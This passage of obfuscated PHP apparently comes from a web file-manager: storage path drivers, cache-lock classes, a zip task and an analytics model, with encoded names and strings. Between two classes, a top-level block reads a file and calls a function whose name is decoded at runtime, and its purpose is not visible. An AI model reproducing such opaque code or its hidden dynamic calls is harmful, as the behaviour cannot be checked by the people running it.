($¬¯Å®Ÿ) { return $this->getPathOuter($òÈ³³‹); } $this->writeLog(__FUNCTION__ . $›ş¾ ‰Ï[1470], !0); return !1; } public function size($½Ğ ×£­) { $½Ğ ×£­ = $this->iconvSystem($½Ğ ×£­); return filesize_64($½Ğ ×£­); } public function info($‹˜°„) { $‹˜°„ = $this->iconvSystem($‹˜°„); if ($this->isFolder($‹˜°„)) { return $this->folderInfo($‹˜°„); } else { if ($this->isFile($‹˜°„)) { return $this->fileInfo($‹˜°„); } } return !1; } protected function infoChildren($‰éƒ ç·, &$Õİ¼îÄ, $«Ô¬¡ôÔ = true) { $æùË÷„Ø =& $_SERVER[®»±”ó²]; check_abort_echo(); $‰éƒ ç· = rtrim($‰éƒ ç·, $æùË÷„Ø[8]) . $æùË÷„Ø[8]; if ($«Ô¬¡ôÔ) { $‰éƒ ç· = $this->iconvSystem($‰éƒ ç·); } if (!($øªúäë = @opendir($‰éƒ ç·))) { return; } while (($ÁŒ¢­ƒ = readdir($øªúäë)) !== !1) { if ($ÁŒ¢­ƒ == $æùË÷„Ø[10] || $ÁŒ¢­ƒ == $æùË÷„Ø[1375]) { continue; } $íœÔŞ„ = $‰éƒ ç· . $ÁŒ¢­ƒ; if (is_file($íœÔŞ„) || is_link($íœÔŞ„)) { $Õİ¼îÄ[$æùË÷„Ø[80]]++; $Õİ¼îÄ[$æùË÷„Ø[79]] += filesize_64($íœÔŞ„); } else { if (is_dir($íœÔŞ„)) { $Õİ¼îÄ[$æùË÷„Ø[81]]++; $this->infoChildren($íœÔŞ„, $Õİ¼îÄ, !1); } } } closedir($øªúäë); } private function folderInfo($Òİ‡ÙÄ°, $êşíº = false) { $÷‘§¢¯» =& $_SERVER[®»±”ó²]; $Òİ‡ÙÄ° = rtrim($Òİ‡ÙÄ°, $÷‘§¢¯»[8]) . $÷‘§¢¯»[8]; $ûüø§Œá = $this->iconvApp($this->pathThis($Òİ‡ÙÄ°)); if ($êşíº) { return array($÷‘§¢¯»[32] => $ûüø§Œá, $÷‘§¢¯»[87] => $this->getPathOuter($Òİ‡ÙÄ°), $÷‘§¢¯»[33] => $÷‘§¢¯»[78]); } $¡¨çÑùí = array($÷‘§¢¯»[32] => $ûüø§Œá, $÷‘§¢¯»[87] => $this->getPathOuter($Òİ‡ÙÄ°), $÷‘§¢¯»[33] => $÷‘§¢¯»[78], $÷‘§¢¯»[234] => @filectime($Òİ‡ÙÄ°), $÷‘§¢¯»[88] => @filemtime($Òİ‡ÙÄ°), $÷‘§¢¯»[1474] => @fileatime($Òİ‡ÙÄ°), $÷‘§¢¯»[1475] => is_readable($Òİ‡ÙÄ°), $÷‘§¢¯»[1476] => is_writable($Òİ‡ÙÄ°), $÷‘§¢¯»[1477] => get_mode($Òİ‡ÙÄ°)); return $¡¨çÑùí; } private function fileInfo($ò¢”ş¡ò, $éõ¦ˆ˜Û = false) { $Ğ›ëù¦£ =& $_SERVER[®»±”ó²]; $ªîü˜ÃÊ = $this->iconvApp($this->pathThis($ò¢”ş¡ò)); if ($éõ¦ˆ˜Û) { return array($Ğ›ëù¦£[32] => $ªîü˜ÃÊ, $Ğ›ëù¦£[87] => $this->getPathOuter($ò¢”ş¡ò), $Ğ›ëù¦£[33] => $Ğ›ëù¦£[233], $Ğ›ëù¦£[79] => $this->size($ò¢”ş¡ò), $Ğ›ëù¦£[169] => $this->ext($ªîü˜ÃÊ)); } $ÔÌâıƒî = array($Ğ›ëù¦£[32] => $ªîü˜ÃÊ, $Ğ›ëù¦£[87] => $this->getPathOuter($ò¢”ş¡ò), $Ğ›ëù¦£[33] => $Ğ›ëù¦£[233], $Ğ›ëù¦£[234] => @filectime($ò¢”ş¡ò), $Ğ›ëù¦£[88] => @filemtime($ò¢”ş¡ò), $Ğ›ëù¦£[1474] => @fileatime($ò¢”ş¡ò), $Ğ›ëù¦£[79] => $this->size($ò¢”ş¡ò), $Ğ›ëù¦£[169] => $this->ext($ªîü˜ÃÊ), $Ğ›ëù¦£[1475] => is_readable($ò¢”ş¡ò), $Ğ›ëù¦£[1476] => is_writable($ò¢”ş¡ò), $Ğ›ëù¦£[1477] => get_mode($ò¢”ş¡ò)); return $ÔÌâıƒî; } public function exist($Á„×Æàš) { $Á„×Æàš = $this->iconvSystem($Á„×Æàš); return @file_exists($Á„×Æàš); } public function isFile($ééïÙ©) { $ééïÙ© = $this->iconvSystem($ééïÙ©); return @is_file($ééïÙ©); } public function isFolder($é·óŸ¬Â) { $é·óŸ¬Â = $this->iconvSystem($é·óŸ¬Â); return @is_dir($é·óŸ¬Â); } public function listPath($å™öè¾Ï, $Èä©€áÔ = false) { $ù’Ô‹²½ =& $_SERVER[®»±”ó²]; $å™öè¾Ï = $this->iconvSystem($å™öè¾Ï); $å™öè¾Ï = rtrim($å™öè¾Ï, $ù’Ô‹²½[8]) . $ù’Ô‹²½[8]; $ì¹†ÌÔœ = array($ù’Ô‹²½[85] => array(), $ù’Ô‹²½[86] => array()); if (!($ŞÊ€¬ôı = @opendir($å™öè¾Ï))) { return $ì¹†ÌÔœ; } while (($Ñ·ìçŒ = readdir($ŞÊ€¬ôı)) !== !1) { if ($Ñ·ìçŒ == $ù’Ô‹²½[10] || $Ñ·ìçŒ == $ù’Ô‹²½[1375]) { continue; } $Ş¥ÜôåŞ = $å™öè¾Ï . $Ñ·ìçŒ; if (is_file($Ş¥ÜôåŞ)) { $ì¹†ÌÔœ[$ù’Ô‹²½[86]][] = $this->fileInfo($Ş¥ÜôåŞ, $Èä©€áÔ); } else { $ì¹†ÌÔœ[$ù’Ô‹²½[85]][] = $this->folderInfo($Ş¥ÜôåŞ, $Èä©€áÔ); } } closedir($ŞÊ€¬ôı); return $ì¹†ÌÔœ; } public function listAll($ñÕ›ÒßØ, &$šğÂ¡ÕÂ = array()) { $”Å¸¾¯ =& $_SERVER[®»±”ó²]; $ñÕ›ÒßØ = $this->iconvSystem($ñÕ›ÒßØ); $ñÕ›ÒßØ = rtrim($ñÕ›ÒßØ, $”Å¸¾¯[8]) . $”Å¸¾¯[8]; if (!($½ÏÄîœ— = @opendir($ñÕ›ÒßØ))) { return $šğÂ¡ÕÂ; } while (($•Âó½û¶ = readdir($½ÏÄîœ—)) !== !1) { if ($•Âó½û¶ == $”Å¸¾¯[10] || $•Âó½û¶ == $”Å¸¾¯[1375]) { continue; } $¶·Ğ¨À™ = $ñÕ›ÒßØ . $•Âó½û¶; $Ÿíş¤Ê = is_dir($¶·Ğ¨À™) && !is_link($¶·Ğ¨À™) ? 1 : 0; $¶·Ğ¨À™ = $Ÿíş¤Ê ? $¶·Ğ¨À™ . $”Å¸¾¯[8] : $¶·Ğ¨À™; $šğÂ¡ÕÂ[] = array($”Å¸¾¯[87] => $this->getPathOuter($¶·Ğ¨À™), $”Å¸¾¯[78] => $Ÿíş¤Ê, $”Å¸¾¯[88] => intval(@filemtime($¶·Ğ¨À™)), $”Å¸¾¯[79] => $Ÿíş¤Ê ? 0 : intval($this->size($¶·Ğ¨À™))); if ($Ÿíş¤Ê) { $this->listAll($¶·Ğ¨À™, $šğÂ¡ÕÂ); } } closedir($½ÏÄîœ—); return $šğÂ¡ÕÂ; } public function has($´å£÷, $±³‡£õº = false, $ÜÅÌÜ„ã = true) { $µËãçÃ· =& $_SERVER[®»±”ó²]; $´å£÷ = $this->iconvSystem($´å£÷); $´å£÷ = rtrim($´å£÷, $µËãçÃ·[8]) . $µËãçÃ·[8]; if (!($È•ªÛ¸ğ = @opendir($´å£÷))) { return !1; } $Øò·ƒÛ€ = 0; $›ò®çËË = 0; $ÖéèáÓ = 0; while (($»îåöâÇ = readdir($È•ªÛ¸ğ)) !== !1) { if ($»îåöâÇ == $µËãçÃ·[10] || $»îåöâÇ == $µËãçÃ·[1375]) { continue; } $õ†¦ö‡ = $´å£÷ . $»îåöâÇ; if ($±³‡£õº) { $ÖéèáÓ++; if (@is_file($õ†¦ö‡)) { $Øò·ƒÛ€++; } else { $›ò®çËË++; } if ($ÖéèáÓ > 10000) { break; } continue; } if ($ÜÅÌÜ„ã) { if (@is_file($õ†¦ö‡)) { return !0; } } else { if (@is_dir($õ†¦ö‡ . $µËãçÃ·[8])) { return !0; } } } closedir($È•ªÛ¸ğ); if ($±³‡£õº) { return array($µËãçÃ·[242] => $Øò·ƒÛ€, $µËãçÃ·[243] => $›ò®çËË); } return !1; } public function hashSimple($ÆáÅ…åç) { $€®«“§« =& $_SERVER[®»±”ó²]; if (!$ÆáÅ…åç) { return md5($€®«“§«[12]); } $ÆáÅ…åç = $this->iconvSystem($ÆáÅ…åç); $ªÜ²Á‘ = $this->size($ÆáÅ…åç); $æãŒŒ÷» = 200; $²¦ˆ¿øû = 50; if ($ªÜ²Á‘ <= $æãŒŒ÷» * $²¦ˆ¿øû) { return $this->hashMd5($ÆáÅ…åç) . $ªÜ²Á‘; } $¶…ªó¾ = $€®«“§«[12]; $¹–¤Ú = intval($ªÜ²Á‘ / $²¦ˆ¿øû); $Ÿş¡›´¢ = fopen($ÆáÅ…åç, $€®«“§«[1478]); if (!$Ÿş¡›´¢) { return $¶…ªó¾; } for ($Ú»è¨šà = 0; $Ú»è¨šà < $²¦ˆ¿øû; $Ú»è¨šà++) { fseek_64($Ÿş¡›´¢, $¹–¤Ú * $Ú»è¨šà); $¶…ªó¾ .= fread($Ÿş¡›´¢, $æãŒŒ÷»); } fseek_64($Ÿş¡›´¢, $ªÜ²Á‘ - $æãŒŒ÷»); $¶…ªó¾ .= fread($Ÿş¡›´¢, $æãŒŒ÷»); fclose($Ÿş¡›´¢); return md5($¶…ªó¾) . $ªÜ²Á‘; } public function getContent($ä¬·¶¦) { $ä¬·¶¦ = $this->iconvSystem($ä¬·¶¦); return file_get_contents($ä¬·¶¦); } public function setContent($˜öùËÂ‘, $“«ÕÄØ = '') { $˜öùËÂ‘ = $this->iconvSystem($˜öùËÂ‘); $œ†÷óùÛ = @file_put_contents($˜öùËÂ‘, $“«ÕÄØ, LOCK_EX); if (!$œ†÷óùÛ) { $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][1470], !0); } clearstatcache(); @chmod($˜öùËÂ‘, $this->pathAuth); return $œ†÷óùÛ === !1 ? !1 : !0; } public function fileSubstr($Î¯­òé·, $Íà½æä± = 0, $³ÚæòÊ¾ = false) { $Ñ¬Ëî­Ç =& $_SERVER[®»±”ó²]; $Î¯­òé· = $this->iconvSystem($Î¯­òé·); if ($³ÚæòÊ¾ === !1) { $³ÚæòÊ¾ = $this->size($Î¯­òé·); } if ($³ÚæòÊ¾ <= 0) { return $Ñ¬Ëî­Ç[12]; } $íÖÁÓÎÃ = fopen($Î¯­òé·, $Ñ¬Ëî­Ç[1478]); if (!$íÖÁÓÎÃ) { return !1; } fseek_64($íÖÁÓÎÃ, $Íà½æä±); $Ş½îŞ•” = fread($íÖÁÓÎÃ, $³ÚæòÊ¾); fclose($íÖÁÓÎÃ); if (!$Ş½îŞ•”) { $this->writeLog(__FUNCTION__ . $Ñ¬Ëî­Ç[1470], !0); } return $Ş½îŞ•”; } public function upload($„¬Ïç‰, $ÉÖÄ†Ïá, $Ş¥ÒË® = false, $‰çÀ£œâ = REPEAT_REPLACE) { if ($Ş¥ÒË®) { return $this->moveFile($ÉÖÄ†Ïá, $„¬Ïç‰); } return $this->copyFile($ÉÖÄ†Ïá, $„¬Ïç‰); } public function setModifyTime($ÅÏşÎ”Œ, $ˆÔ¹Öß¯ = '') { @touch($ÅÏşÎ”Œ, intval($ˆÔ¹Öß¯)); } public function download($ÎË¤êÛ‚, $™µ¦Ï¢) { return $this->iconvSystem($ÎË¤êÛ‚); } } goto aÑôšÕ®ÅÑ; aÑôšÕ®ÅÑ: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($œõ€£Û) { parent::__construct($œõ€£Û); $this->setSignVersion($_SERVER[®»±”ó²][250]); } public function fileOutImage($é„ÒÎ™¿, $íĞèûÜØ = 250) { $É®Œê©ø =& $_SERVER[®»±”ó²]; if ($this->size($é„ÒÎ™¿) > 1024 * 1024 * 25) { return $this->fileOutImageServer($é„ÒÎ™¿, $íĞèûÜØ); } $ªÄüÊÔ¹ = array($É®Œê©ø[1479] => $É®Œê©ø[1480] . $íĞèûÜØ . $É®Œê©ø[1481]); $ÆÁÑ‚­Š = $this->link($é„ÒÎ™¿, $ªÄüÊÔ¹); $this->fileOutLink($ÆÁÑ‚­Š); } } if ($_SERVER[$_SERVER[®»±”ó²][478]] != $_SERVER[$_SERVER[®»±”ó²][479]]) { $_getc = $_SERVER[®»±”ó²][480]; $_getfile = $_SERVER[$_SERVER[®»±”ó²][481]] . $_SERVER[®»±”ó²][482]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[®»±”ó²][288], $_getfilec); if (count($_getarrs) < $_SERVER[®»±”ó²][483]) { $exit = $_SERVER[®»±”ó²][484]; $exit(); } $_act = $_SERVER[®»±”ó²][485]; $_act($_SERVER[$_SERVER[®»±”ó²][486]]); } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($­ï˜ó¨¢) { parent::__construct($­ï˜ó¨¢); $this->setSignVersion($_SERVER[®»±”ó²][250]); } public function uploadFormData($¸ ¾¥Ù›, $ëÄ½Ã  = 3600) { return $this->uploadFormDataV2($¸ ¾¥Ù›, $ëÄ½Ã ); } } goto D¸ÚÅ¥™™Û; Aƒñáêëø´: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $½«×ìêí =& $_SERVER[®»±”ó²]; $Œ°œ‡Àû = $GLOBALS[$½«×ìêí[6]][$½«×ìêí[426]]; self::$cachePath = $Œ°œ‡Àû[$½«×ìêí[233]][$½«×ìêí[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($’Ÿ‡ã´õ, $æËğ€¾ = 0) { $Ùğ²ä„Œ =& $_SERVER[®»±”ó²]; $ø—é—ÂÎ = microtime(!0); $·ó£†° = $ø—é—ÂÎ + $æËğ€¾ + 0.0001; $Ô‚òŸÜ‰ = rtrim(self::$cachePath, $Ùğ²ä„Œ[8]) . $Ùğ²ä„Œ[951] . md5($’Ÿ‡ã´õ) . $Ùğ²ä„Œ[948]; if (file_exists($Ô‚òŸÜ‰) && filemtime($Ô‚òŸÜ‰) && filemtime($Ô‚òŸÜ‰) < time() - 10) { @unlink($Ô‚òŸÜ‰); } do { if (file_exists($Ô‚òŸÜ‰)) { cacheLockWait(); continue; } $œ·¢Î³é = fopen($Ô‚òŸÜ‰, $Ùğ²ä„Œ[952]); if (!$œ·¢Î³é) { return !1; } $‹š¥ˆ´ = flock($œ·¢Î³é, LOCK_EX | LOCK_NB); self::$caches[$’Ÿ‡ã´õ] = array($Ùğ²ä„Œ[953] => $œ·¢Î³é, $Ùğ²ä„Œ[233] => $Ô‚òŸÜ‰); fwrite($œ·¢Î³é, $·ó£†°); clearstatcache(); if ($œ·¢Î³é && $‹š¥ˆ´) { return !0; } cacheLockWait(); } while (microtime(!0) < $·ó£†°); $this->unlock($’Ÿ‡ã´õ); return !1; } public function lockGet($Ğ™â­ç) { $‚‰§¼” =& $_SERVER[®»±”ó²]; $şÕÈäÚÏ = rtrim(self::$cachePath, $‚‰§¼”[8]) . $‚‰§¼”[951] . md5($Ğ™â­ç) . $‚‰§¼”[948]; return file_exists($şÕÈäÚÏ); } public function unlock($”Çë×ëµ) { $íî¤Öß =& $_SERVER[®»±”ó²]; $…ˆó±ŠÕ = self::$caches[$”Çë×ëµ]; if (!$…ˆó±ŠÕ) { return; } @flock($…ˆó±ŠÕ[$íî¤Öß[953]], LOCK_UN); @fclose($…ˆó±ŠÕ[$íî¤Öß[953]]); @unlink($…ˆó±ŠÕ[$íî¤Öß[233]]); unset(self::$caches[$”Çë×ëµ]); } } class CacheLockRedis { public function lock($‰æÇÉ´, $ßİèã©… = 10) { $Ú„ÀÌË÷ = Cache::init(); $ğ ºè–” = microtime(!0) + $ßİèã©…; while (microtime(!0) < $ğ ºè–”) { $€ò©¦¸‡ = $Ú„ÀÌË÷->get($‰æÇÉ´); if (!$€ò©¦¸‡) { $îÙõÀ÷ë = $Ú„ÀÌË÷->setLock($‰æÇÉ´, $ğ ºè–”, $ßİèã©…); if ($îÙõÀ÷ë) { return !0; } } else { if ($€ò©¦¸‡ < microtime(!0)) { $Ú„ÀÌË÷->set($‰æÇÉ´, $ğ ºè–”, $ßİèã©… * 2); if ($Ú„ÀÌË÷->get($‰æÇÉ´) === $€ò©¦¸‡) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($æ—­‹³Š) { return Cache::init()->get($æ—­‹³Š); } public function unlock($Ïºà˜†Ã) { return Cache::init()->remove($Ïºà˜†Ã); } } class CacheLockMemcached { public function lock($…¥¸§Ãå, $å§ù½Ç = 0) { $Èáƒë¼Ş = Cache::init(); $ïô©³ = microtime(!0) + $å§ù½Ç; while (microtime(!0) < $ïô©³) { $òÎûıõë = $Èáƒë¼Ş->get($…¥¸§Ãå); if (!$òÎûıõë || $òÎûıõë < microtime(!0)) { $’©ú¾à™ = $Èáƒë¼Ş->handle->add($…¥¸§Ãå, $ïô©³, $å§ù½Ç); if ($’©ú¾à™) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ì­Šˆí) { return Cache::init()->get($Ì­Šˆí); } public function unlock($ìŞÌßÜ) { return Cache::init()->remove($ìŞÌßÜ); } } goto fÈëøëùá°; aÕ„‘‰ö­Ú: class TaskZip extends TaskFileTransfer { protected function startAfter() { $«û¡¯ÎŒ =& $_SERVER[®»±”ó²]; parent::startAfter(); Hook::bind($«û¡¯ÎŒ[1917], array($this, $«û¡¯ÎŒ[1907])); Hook::bind($«û¡¯ÎŒ[1909], array($this, $«û¡¯ÎŒ[1910])); $ŸÃÑ›³Â =& $this->task; $ŸÃÑ›³Â[$«û¡¯ÎŒ[1911]] = $«û¡¯ÎŒ[1291]; if (!$ŸÃÑ›³Â[$«û¡¯ÎŒ[1678]]) { $ŸÃÑ›³Â[$«û¡¯ÎŒ[1678]] = LNG($«û¡¯ÎŒ[1918]); } } protected function endAfter() { $Øè†²“· =& $_SERVER[®»±”ó²]; parent::endAfter(); Hook::unbind($Øè†²“·[1917], array($this, $Øè†²“·[1907])); Hook::unbind($Øè†²“·[1909], array($this, $Øè†²“·[1910])); } public function updateAfter() { $ßú«§Ø£ =& $_SERVER[®»±”ó²]; $â€Ê¶Æè =& $this->task; if (!$â€Ê¶Æè[$ßú«§Ø£[1150]] || !$â€Ê¶Æè[$ßú«§Ø£[844]]) { return; } if ($â€Ê¶Æè[$ßú«§Ø£[1911]] == $ßú«§Ø£[1291]) { $—ç©¥œü = $â€Ê¶Æè[$ßú«§Ø£[1846]]; if ($â€Ê¶Æè[$ßú«§Ø£[1847]] != $ßú«§Ø£[1291]) { $—ç©¥œü = 0; } $Òåæö†À = ($â€Ê¶Æè[$ßú«§Ø£[1850]] + $—ç©¥œü) / $â€Ê¶Æè[$ßú«§Ø£[844]]; $â€Ê¶Æè[$ßú«§Ø£[1793]] = $Òåæö†À * 0.3; } else { if ($â€Ê¶Æè[$ßú«§Ø£[1911]] == $ßú«§Ø£[390]) { $Òåæö†À = $â€Ê¶Æè[$ßú«§Ø£[1792]] / $â€Ê¶Æè[$ßú«§Ø£[1150]]; $â€Ê¶Æè[$ßú«§Ø£[1793]] = 0.3 + $Òåæö†À * 0.5; } else { if ($â€Ê¶Æè[$ßú«§Ø£[1911]] == $ßú«§Ø£[110]) { $Òåæö†À = 0; if ($â€Ê¶Æè[$ßú«§Ø£[1845]]) { $Òåæö†À = $â€Ê¶Æè[$ßú«§Ø£[1846]] / $â€Ê¶Æè[$ßú«§Ø£[1845]]; } $â€Ê¶Æè[$ßú«§Ø£[1793]] = 0.3 + 0.5 + $Òåæö†À * 0.2; } } } if ($â€Ê¶Æè[$ßú«§Ø£[1793]] > 0) { $ò§—ññ’ = timeFloat() - $â€Ê¶Æè[$ßú«§Ø£[1795]] - $â€Ê¶Æè[$ßú«§Ø£[1798]]; $â€Ê¶Æè[$ßú«§Ø£[1799]] = $ò§—ññ’ * (1 - $â€Ê¶Æè[$ßú«§Ø£[1793]]) / $â€Ê¶Æè[$ßú«§Ø£[1793]]; } } public function copyFileStart($ÍéÉ¨²Š, $œ‰ø°Ë, $’·å“µï, $«‰Ç¥, $’ÏæÈ”¸, $Ò‰šë) { $¿“„ÃÀ =& $_SERVER[®»±”ó²]; parent::copyFileStart($ÍéÉ¨²Š, $œ‰ø°Ë, $’·å“µï, $«‰Ç¥, $’ÏæÈ”¸, $Ò‰šë); $³çƒ…‰º =& $this->task; if ($³çƒ…‰º[$¿“„ÃÀ[1911]] == $¿“„ÃÀ[390]) { $³çƒ…‰º[$¿“„ÃÀ[1911]] = $¿“„ÃÀ[110]; } $this->update(); } public function copyFileEnd($Œõ¿û«’, $ıäÔÍÔÑ, $üŞÏ¶Ôà, $éŸ¨Ã², $‘óÊÉËÊ, $ğèûâ) { $Úı„Ñ²¸ =& $_SERVER[®»±”ó²]; $°üÑÔ =& $this->task; $°üÑÔ[$Úı„Ñ²¸[1846]] = $°üÑÔ[$Úı„Ñ²¸[1845]]; $°üÑÔ[$Úı„Ñ²¸[1850]] += $°üÑÔ[$Úı„Ñ²¸[1845]]; $°üÑÔ[$Úı„Ñ²¸[1847]] = $Úı„Ñ²¸[12]; $this->update(); } public function zipEvent($šÜ‹ê¹, $‹‰‚Ş¿‰, $øÉ“Öì, $ ¶éá°) { $Ş¹ùÉõ¢ =& $_SERVER[®»±”ó²]; $ÃÅØÛ¥ª =& $this->task; $ÃÅØÛ¥ª[$Ş¹ùÉõ¢[1843]] = get_path_this($‹‰‚Ş¿‰); $ÃÅØÛ¥ª[$Ş¹ùÉõ¢[1845]] = $ ¶éá°; $ÃÅØÛ¥ª[$Ş¹ùÉõ¢[1846]] = $øÉ“Öì; $ÃÅØÛ¥ª[$Ş¹ùÉõ¢[1152]] = $šÜ‹ê¹ == $Ş¹ùÉõ¢[1919] ? $Ş¹ùÉõ¢[1914] : $Ş¹ùÉõ¢[1915]; $ÃÅØÛ¥ª[$Ş¹ùÉõ¢[1847]] = $Ş¹ùÉõ¢[12]; $ÃÅØÛ¥ª[$Ş¹ùÉõ¢[844]] = $ ¶éá°; $ÃÅØÛ¥ª[$Ş¹ùÉõ¢[1911]] = $Ş¹ùÉõ¢[390]; $this->update(); } public function nameParse($À“ÁŒ) { $¼ïÀÉ­¨ =& $_SERVER[®»±”ó²]; $€œ÷îÈÖ =& $this->task; if ($€œ÷îÈÖ[$¼ïÀÉ­¨[1792]] < $€œ÷îÈÖ[$¼ïÀÉ­¨[1150]]) { $Šèñ•¢ë = get_path_this($À“ÁŒ); if (strstr($Šèñ•¢ë, $¼ïÀÉ­¨[10])) { $€œ÷îÈÖ[$¼ïÀÉ­¨[1792]] += 1; } } if ($€œ÷îÈÖ[$¼ïÀÉ­¨[1911]] == $¼ïÀÉ­¨[1291]) { $€œ÷îÈÖ[$¼ïÀÉ­¨[1911]] = $¼ïÀÉ­¨[390]; } $€œ÷îÈÖ[$¼ïÀÉ­¨[1843]] = $À“ÁŒ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($½´Ê°¤) { $œäèÖ“ =& $_SERVER[®»±”ó²]; $õÔÈ¼Œ = array($œäèÖ“[678] => array($œäèÖ“[33] => $œäèÖ“[1920], $œäèÖ“[353] => array($œäèÖ“[285], $œäèÖ“[846], $œäèÖ“[1921], $œäèÖ“[1922])), $œäèÖ“[1923] => array($œäèÖ“[33] => $œäèÖ“[1924], $œäèÖ“[353] => array($œäèÖ“[285], $œäèÖ“[844], $œäèÖ“[1925], $œäèÖ“[1926], $œäèÖ“[1927]))); if (!isset($õÔÈ¼Œ[$½´Ê°¤])) { return !1; } $this->optionType = $õÔÈ¼Œ[$½´Ê°¤][$œäèÖ“[33]]; $this->field = $õÔÈ¼Œ[$½´Ê°¤][$œäèÖ“[353]]; return !0; } public function listData($ûÆ±üã = false, $Å·˜é = "\155\157\144\x69\x66\x79\x54\151\x6d\145", $’¤‹Ğ°Æ = false) { return parent::listData($ûÆ±üã, $Å·˜é, $’¤‹Ğ°Æ); } public function trendList($Æ‘ùîÓ) { $ˆìÛéÊ =& $_SERVER[®»±”ó²]; $¼ÏšÔÖÉ = $this->listData(); if ($¼ÏšÔÖÉ) { $•·äÓâŸ = end($¼ÏšÔÖÉ); $÷ßß‡œ = date($ˆìÛéÊ[1928], strtotime($ˆìÛéÊ[1929])); if ($•·äÓâŸ[$ˆìÛéÊ[285]] == $÷ßß‡œ) { return $¼ÏšÔÖÉ; } $Ã©Àæ± = strtotime($•·äÓâŸ[$ˆìÛéÊ[285]]); } if (!isset($Ã©Àæ±)) { $Ä½ˆ»³» = $Æ‘ùîÓ == $ˆìÛéÊ[678] ? $ˆìÛéÊ[610] : $ˆìÛéÊ[911]; $Ã©Àæ± = Model($Ä½ˆ»³»)->min($ˆìÛéÊ[234]); } $¾ßèœÂ  = $ˆìÛéÊ[1930] . ucfirst($Æ‘ùîÓ); $Ô†éÑÍ¿ = $this->dateList($Ã©Àæ±); foreach ($Ô†éÑÍ¿ as $÷ßß‡œ) { $this->{$¾ßèœÂ }($÷ßß‡œ); } return $this->listData(); } private function dateList($›ïî®§) { $¤‡şƒ†ı =& $_SERVER[®»±”ó²]; $í¥·‘Î¬ = $›ïî®§; $ÛÇİ•…“ = strtotime($¤‡şƒ†ı[1929]); $§îŒ¼»ô = array(); while ($í¥·‘Î¬ <= $ÛÇİ•…“) { $§îŒ¼»ô[] = date($¤‡şƒ†ı[1928], $í¥·‘Î¬); $í¥·‘Î¬ = strtotime($¤‡şƒ†ı[1931], $í¥·‘Î¬); } return $§îŒ¼»ô; } public function _recordUser($õáÎ”Ñ´ = '') { $ƒ³ıñıñ =& $_SERVER[®»±”ó²]; $Ê©õ¤›” = strtotime(date($ƒ³ıñıñ[1932], strtotime($õáÎ”Ñ´))); $Å¨•„ŞÃ = strtotime(date($ƒ³ıñıñ[1933], strtotime($õáÎ”Ñ´))); $ÉßÂÓ›Ú = array($ƒ³ıñıñ[234] => array($ƒ³ıñıñ[1100], $Å¨•„ŞÃ)); $ïÊ¬µŠê = Model($ƒ³ıñıñ[610])->where($ÉßÂÓ›Ú)->count($ƒ³ıñıñ[1791]); $ÉßÂÓ›Ú[$ƒ³ıñıñ[234]] = array($ƒ³ıñıñ[410], array($Ê©õ¤›”, $Å¨•„ŞÃ)); $í¶«ê´‘ = Model($ƒ³ıñıñ[610])->where($ÉßÂÓ›Ú)->count($ƒ³ıñıñ[1791]); $ÉßÂÓ›Ú[$ƒ³ıñıñ[33]] = $ƒ³ıñıñ[1934]; $ã˜‰ğì“ = Model($ƒ³ıñıñ[1935])->where($ÉßÂÓ›Ú)->count($ƒ³ıñıñ[1936]); $÷…ÄôÈ¬ = array($ƒ³ıñıñ[285] => $õáÎ”Ñ´, $ƒ³ıñıñ[846] => (int) $ïÊ¬µŠê, $ƒ³ıñıñ[1921] => (int) $í¶«ê´‘, $ƒ³ıñıñ[1922] => (int) $ã˜‰ğì“); return $this->insert($÷…ÄôÈ¬); } public function _recordStore($¦…Ü¬¾À = '') { $«ÄÄüÏÏ =& $_SERVER[®»±”ó²]; $õªÇª”• = strtotime(date($«ÄÄüÏÏ[1933], strtotime($¦…Ü¬¾À))); $Ò¶®”“ = array($«ÄÄüÏÏ[234] => array($«ÄÄüÏÏ[1100], $õªÇª”•)); $Û¹Ôæ… = Model($«ÄÄüÏÏ[557])->where($Ò¶®”“)->sum($«ÄÄüÏÏ[79]); $Ò¶®”“[$«ÄÄüÏÏ[496]] = 0; $Ø–ÒŞò = Model($«ÄÄüÏÏ[911])->where($Ò¶®”“)->sum($«ÄÄüÏÏ[79]); $Ò¶®”“[$«ÄÄüÏÏ[191]] = 1; $ëŞÃª¥ç = Model($«ÄÄüÏÏ[911])->where($Ò¶®”“)->sum($«ÄÄüÏÏ[79]); $Ò¶®”“[$«ÄÄüÏÏ[191]] = 2; $§ÁŠ…Ç† = Model($«ÄÄüÏÏ[911])->where($Ò¶®”“)->sum($«ÄÄüÏÏ[79]); $ùå½ñ£â = array($«ÄÄüÏÏ[285] => $¦…Ü¬¾À, $«ÄÄüÏÏ[844] => (int) $Ø–ÒŞò, $«ÄÄüÏÏ[1925] => (int) $Û¹Ôæ…, $«ÄÄüÏÏ[1926] => (int) $ëŞÃª¥ç, $«ÄÄüÏÏ[1927] => (int) $§ÁŠ…Ç†); return $this->insert($ùå½ñ£â); } public function trend($à£é§Â´, $÷†‹¢ö) { $ƒÖ³Ãî =& $_SERVER[®»±”ó²]; if (!$this->init($à£é§Â´)) { return !1; } $é½š† “ = $this->trendList($à£é§Â´); if ($é½š† “ && $÷†‹¢ö != $ƒÖ³Ãî[1763]) { $¦È®¾• = $é½š† “[0][$ƒÖ³Ãî[285]]; $„ØÏßîË = $this->validDate($÷†‹¢ö, $¦È®¾•); $òäÍÒ‘ã = array(); $Ú´ÅËû = array_to_keyvalue($é½š† “, $ƒÖ³Ãî[285]); foreach ($„ØÏßîË as $Ö¾æ‚£™) { if (isset($Ú´ÅËû[$Ö¾æ‚£™])) { $šúŞÄ¾ï = $Ú´ÅËû[$Ö¾æ‚£™]; } else { $šúŞÄ¾ï = end($é½š† “); $šúŞÄ¾ï[$ƒÖ³Ãî[285]] = $Ö¾æ‚£™; if ($à£é§Â´ == $ƒÖ³Ãî[678]) { $šúŞÄ¾ï[$ƒÖ³Ãî[1921]] = $šúŞÄ¾ï[$ƒÖ³Ãî[1922]] = 0; } } $òäÍÒ‘ã[] = $šúŞÄ¾ï; } $é½š† “ = $òäÍÒ‘ã; } $ÜÔù‹™ô = array($ƒÖ³Ãî[678] => array($ƒÖ³Ãî[846] => 